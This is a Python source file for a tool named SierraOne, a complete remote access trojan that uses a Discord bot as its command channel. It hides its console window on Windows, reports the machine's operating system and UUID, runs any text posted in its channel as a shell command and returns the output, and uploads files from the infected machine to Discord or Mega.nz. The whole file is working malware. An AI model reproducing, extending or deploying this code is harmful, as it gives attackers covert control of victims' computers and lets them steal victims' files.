import config
import discord
from discord.ext import commands
import io
from mega import Mega
import os
import platform
import subprocess
import sys

bot = commands.Bot(command_prefix=".")

channel = None

@bot.event
async def on_ready():
    # Get server name
    guild = bot.get_guild(server_id)

    # Create 'SierraOne' category
    category = await create_category(guild)

    # Get a list of the text channels in the server
    channels = guild.text_channels

    global channel

    # Create 'sierra-hotel-'
    channel = await create_channel(category, channels)

    # Get the machine info
    info = await machine_info()

    # Send the machine info to 'sierra-hotel-'
    # Remove 'embed=info' if you want to use the alternative
    send_info = await channel.send(embed=info)

    # Pin the machine info to 'sierra-hotel-'
    await send_info.pin()

    if config.mega_email == "" and config.mega_password == "":
        await channel.send("**WARNING**\nMega credentials were not found. All your uploads larger than 7.5 MB will be split into chunks and uploaded over Discord.")

    else:
        await channel.send("Mega credentials found. All your uploads larger than 7.5 MB will be uploaded to Mega.")

# Create 'SierraOne' category
async def create_category(guild):
    category = discord.utils.get(guild.categories, name=category_prefix)

    if not category:
        category = await guild.create_category(category_prefix)

    return category


# Create 'sierra-hotel-'
async def create_channel(category, channels):
    shell_number = await next_channel(channels)

    new_channel = await category.create_text_channel(channel_prefix + str(shell_number))

    return new_channel


# Number 'sierra-hotel-'
async def next_channel(channels):
    numbers = []
    shell_number = 0

    try:
        for channel in channels:
            name = channel.name
            if channel_prefix in name:
                channel_number = name.split("-")[2]
                if channel_number.isdigit():
                    numbers.append(int(channel_number))

        return max(numbers) + 1

    except ValueError:
        return shell_number + 1

    return shell_number


# Get the machine info
async def machine_info():
    if platform.system() == "Windows":
        machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
    elif platform.system() == "Linux":
        machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
    elif platform.system() == "Darwin":
        machine_UUID = str(subprocess.check_output(["ioreg",
                                                    "-d2",
                                                    "-c",
                                                    "IOPlatformExpertDevice",
                                                    "|",
                                                    "awk",
                                                    "-F",
                                                    "'/IOPlatformUUID/{print $(NF-1)}'"
                                                   ])
                           )
    else:
        machine_UUID = str("Unknown")

    message = discord.Embed(title="Machine Info", type="rich")
    message.add_field(name="Operating System", value=platform.system())
    message.add_field(name="UUID", value=machine_UUID)
    
    # Non-embed alternative
    # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."

    return message


@bot.event
async def on_message(message):
    if message.author.id == bot.user.id:
        return
    else:
        await shell_input(channel, message)


async def shell_input(channel, message):
    # Checks if the message was sent to 'sierra-hotel-'
    if message.channel == channel:
        # Check if the message content starts with "upload"
        if message.content.startswith("upload"):
            try:
                # In reality it's 8 MB, but for the sake of having upload issues, it's been set to 7.5 MB
                discord_limit = 7864320 
                sierraone_limit = 33554432

                name = message.content[7:].split(".")[0]
                extension = message.content[7:].split(".")[1]

                if os.path.getsize(message.content[7:]) <= discord_limit:
                    await message.channel.send(f"Uploading `{message.content[7:]}`, standby...")
                    await message.channel.send(file=discord.File(message.content[7:]))

                elif discord_limit < os.path.getsize(message.content[7:]) <= sierraone_limit:
                    # Check if Mega.nz credentials are present. If not, split the file into 7.5 MB chunks and upload them over Discord
                    if config.mega_email != "" and config.mega_password != "":
                        await message.channel.send(f"Uploading `{message.content[7:]}` to Mega, standby...")
                        
                        mega_file = mega_nz.upload(message.content[7:])
                        mega_link = mega_nz.get_upload_link(mega_file)

                        await message.channel.send(f"Your Mega link: {mega_link}")

                    else:
                        await message.channel.send("Splitting your file and uploading the parts, standby...")

                        with open(message.content[7:], "rb") as file:
                            chunk = file.read(7864320)

                            i = 1
                            while chunk:
                                bytes = io.BytesIO(chunk)

                                await message.channel.send(f"Uploading `{message.content[7:]}-{i}`, standby...`")
                                await message.channel.send(file=discord.File(bytes, filename=f"{message.content[7:]}-{i}"))
                                
                                chunk = file.read(7864320)
                                i += 1

                else:
                    await message.channel.send("File is too big (> 32 MB)")

            except FileNotFoundError:
                # Notify the user if the requested file was not found
                await message.channel.send("File not found")

        elif message.content.startswith("cd"):
            # Change directories
            os.chdir(message.content[3:])

            # Notify the user of the directory change
            await message.channel.send("`cd` complete")

        # Check if the message content starts with "shell_exit"
        elif message.content.startswith("shell_exit"):
            # Delete the room that the command was invoked in
            await message.channel.delete()

            # Close the shell
            sys.exit(0)

        else:
            try:
                # Try to read the user's input
                user_input = os.popen(message.content).read()
            
            except:
                print("OS POPEN exception!")
            
            if user_input == "":
                await message.channel.send("The command did not return anything")
            else:
                await message.channel.send(f"```{user_input}```")
    
    else:
        return


if platform.system() == "Windows":
    import ctypes
    import pywintypes
    import win32process

    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.system(f"taskkill /PID {pid} /f")

# Server ID
server_id = config.server_id

# Category prefix
category_prefix = config.category_prefix

# Channel prefix
channel_prefix = config.channel_prefix

if config.mega_email != "" and config.mega_password != "":
    mega = Mega()
    mega_nz = mega.login(config.mega_email, config.mega_password)

bot.run(config.bot_token)
